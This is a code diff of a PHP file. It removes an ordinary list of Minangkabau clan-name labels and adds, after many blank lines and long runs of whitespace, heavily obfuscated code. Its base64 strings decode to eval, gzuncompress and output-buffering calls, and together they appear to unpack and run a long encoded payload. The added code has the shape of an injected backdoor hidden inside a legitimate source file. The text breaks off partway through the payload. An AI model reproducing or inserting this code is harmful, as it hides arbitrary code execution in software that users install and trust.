-            self::GUDAM                   => 'Gudam etnis dari Minangkabau',
-            self::GUGUN                   => 'Gugun etnis dari Minangkabau',
-            self::HARAU                   => 'Harau etnis dari Minangkabau',
-            self::JAMBAK                  => 'Jambak etnis dari Minangkabau',
-            self::KABARU                  => 'Kabaru etnis dari Minangkabau',
-            self::KALUMPANG               => 'Kalumpang etnis dari Minangkabau',
-            self::KATAPANG                => 'Katapang etnis dari Minangkabau',
-            self::KAMPAI                  => 'Kampai etnis dari Minangkabau',
-            self::KOTO_MINANGKABAU        => 'Koto etnis dari Minangkabau',
-            self::KORONGGADANG            => 'Koronggadang etnis dari Minangkabau',
-            self::KORONGPANJANG           => 'Korongpanjang etnis dari Minangkabau',
-            self::KORONGDALAM             => 'Korongdalam etnis dari Minangkabau',
-            self::KUTIANYIA               => 'Kutianyia etnis dari Minangkabau',
-            self::LIMOPANJANG             => 'Limopanjang etnis dari Minangkabau',
-            self::LIMOSINGKEK             => 'Limosingkek etnis dari Minangkabau',
-            self::LIMOKORONG              => 'Limokorong etnis dari Minangkabau',
-            self::LUBUKBATANG             => 'Lubukbatang etnis dari Minangkabau',
-            self::MAIH                    => 'Maih etnis dari Minangkabau',
-            self::MALAYU                  => 'Malayu etnis dari Minangkabau',
-            self::MANDAILING_MINANGKABAU  => 'Mandailing etnis dari Minangkabau',
-            self::MANDALIKO               => 'Mandaliko etnis dari Minangkabau',
-            self::MEJAN                   => 'Mejan etnis dari Minangkabau',
-            self::MUAROBASA               => 'Muarobasa etnis dari Minangkabau',
-            self::NANLIMO                 => 'Nanlimo etnis dari Minangkabau',
-            self::NANANAM                 => 'Nananam etnis dari Minangkabau',
-            self::NANTUJUAH               => 'Nantujuah etnis dari Minangkabau',
-            self::NANSAMBILAN             => 'Nansambilan etnis dari Minangkabau',
-            self::NANGKOPUH_KONDANG_KOPUH => 'Nangkopuh/Kondang Kopuh etnis dari Minangkabau',
-            self::NILIANG                 => 'Niliang etnis dari Minangkabau',
-            self::PAGACANCANG             => 'Pagacancang etnis dari Minangkabau',
-            self::PARIKCANCANG            => 'Parikcancang etnis dari Minangkabau',
-            self::PANGIAN                 => 'Pangian etnis dari Minangkabau',
-            self::PAROBEK                 => 'Parobek etnis dari Minangkabau',
-            self::PANAMPUANG              => 'Panampuang etnis dari Minangkabau',
-            self::PAUH                    => 'Pauh etnis dari Minangkabau',
-            self::PANAI                   => 'Panai etnis dari Minangkabau',
-            self::PANAI_LINJUANG          => 'Panai Linjuang etnis dari Minangkabau',
-            self::PANYALAI                => 'Panyalai etnis dari Minangkabau',
-            self::PIBODA_PAYOBADA         => 'Piboda (Payobada) etnis dari Minangkabau',
-            self::PILIANG                 => 'Piliang etnis dari Minangkabau',
-            self::PINYANGEK               => 'Pinyangek etnis dari Minangkabau',
-            self::PITOPANG                => 'Pitopang etnis dari Minangkabau',
-            self::PUNGKUIK                => 'Pungkuik etnis dari Minangkabau',
-            self::PONGGANG                => 'Ponggang etnis dari Minangkabau',
-            self::RABU                    => 'Rabu etnis dari Minangkabau',
-            self::RAJODANI                => 'Rajodani etnis dari Minangkabau',
-            self::SALAYAN                 => 'Salayan etnis dari Minangkabau',
-            self::SALO                    => 'Salo etnis dari Minangkabau',
-            self::SAMBILAN                => 'Sambilan etnis dari Minangkabau',
-            self::SIKUMBANG               => 'Sikumbang etnis dari Minangkabau',
-            self::SIJANGKO                => 'Sijangko etnis dari Minangkabau',
-            self::SIMAUANG                => 'Simauang etnis dari Minangkabau',
-            self::SIGANDANG               => 'Sigandang etnis dari Minangkabau',
-            self::SIDAUA                  => 'Sidaua etnis dari Minangkabau',
-            self::SIMABUA                 => 'Simabua etnis dari Minangkabau',
-            self::SINAPA                  => 'Sinapa etnis dari Minangkabau',
-            self::SINGKUAN                => 'Singkuan etnis dari Minangkabau',
-            self::SINGKUANG               => 'Singkuang etnis dari Minangkabau',
-            self::SIPISANG                => 'Sipisang etnis dari Minangkabau',
-            self::SITABEK                 => 'Sitabek etnis dari Minangkabau',
-            self::SITIMBAGO               => 'Sitimbago etnis dari Minangkabau',
-            self::SITUNGGANG              => 'Situnggang etnis dari Minangkabau',
-            self::SOBORANG                => 'Soborang etnis dari Minangkabau',
-            self::SUMAGEK                 => 'Sumagek etnis dari Minangkabau',
-            self::SUMPU                   => 'Sumpu etnis dari Minangkabau',
-            self::SUMPADANG               => 'Sumpadang etnis dari Minangkabau',
-            self::SUPANJANG               => 'Supanjang etnis dari Minangkabau',
-            self::TAMPUNIK                => 'Tampunik etnis dari Minangkabau',
-            self::TANJUANG                => 'Tanjuang etnis dari Minangkabau',
-            self::TAMBANGPADANG           => 'Tambangpadang etnis dari Minangkabau',
-            self::TIGOLAREH               => 'Tigolareh etnis dari Minangkabau',
-            self::TOBO                    => 'Tobo etnis dari Minangkabau',
-            self::TONGAH                  => 'Tongah etnis dari Minangkabau',
-            self::TOLANG                  => 'Tolang etnis dari Minangkabau',
-            self::TUJUAH                  => 'Tujuah etnis dari Minangkabau',
-            self::TUJUAHINDU              => 'Tujuahindu etnis dari Minangkabau',
-            self::TIGONINIAK              => 'Tigoniniak etnis dari Minangkabau',
-            self::LAINNYA                 => 'Lainnya',
-        ];
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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